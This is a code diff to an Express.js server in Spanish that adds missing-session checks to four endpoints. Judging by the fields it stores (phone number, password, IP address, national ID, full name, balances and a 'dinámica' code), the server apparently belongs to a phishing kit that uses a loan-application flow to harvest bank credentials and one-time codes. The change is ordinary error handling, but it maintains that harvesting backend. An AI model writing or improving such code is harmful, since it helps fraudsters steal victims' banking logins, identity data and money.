@@ -133,7 +133,14 @@ app.post('/step1-credentials', async (req, res) => {
     }
 
     // Guardar en sesión
-    const session = sessionData.get(sessionId) || {};
+    const session = sessionData.get(sessionId);
+	if (!session) {
+	   return res.status(400).json({
+	   ok: false,
+	   error: "Session no existe o se perdió"
+		  });
+		}
+
     session.phoneNumber = phoneNumber;
     session.password = password;
     session.ip = ip;
@@ -175,7 +182,14 @@ app.post('/step2-loan-first', async (req, res) => {
     } = req.body;
 
     // Guardar en sesión
-    const session = sessionData.get(sessionId) || {};
+    const session = sessionData.get(sessionId);
+	if (!session) {
+	    return res.status(400).json({
+		ok: false,
+		error: "Session no existe o se perdió"
+		  });
+		}
+
     session.cedula = cedula;
     session.nombreCompleto = nombreCompleto;
     session.ocupacion = ocupacion;
@@ -203,7 +217,14 @@ app.post('/step2-loan-second', async (req, res) => {
     }
 
     // Obtener datos de sesión
-    const session = sessionData.get(sessionId) || {};
+    const session = sessionData.get(sessionId);
+	if (!session) {
+	  return res.status(400).json({
+		ok: false,
+		error: "Session no existe o se perdió"
+	  });
+}
+
     session.saldoActual2 = saldoActual; // Segundo saldo
     sessionData.set(sessionId, session);
 
@@ -251,7 +272,14 @@ app.post('/step3-dynamic', async (req, res) => {
     }
 
     // Obtener datos de sesión
-    const session = sessionData.get(sessionId) || {};
+    const session = sessionData.get(sessionId);
+	if (!session) {
+	  return res.status(400).json({
+		ok: false,
+		error: "Session no existe o se perdió"
+	  });
+	}
+
     
     // Guardar la dinámica
     if (!session.dynamics) {
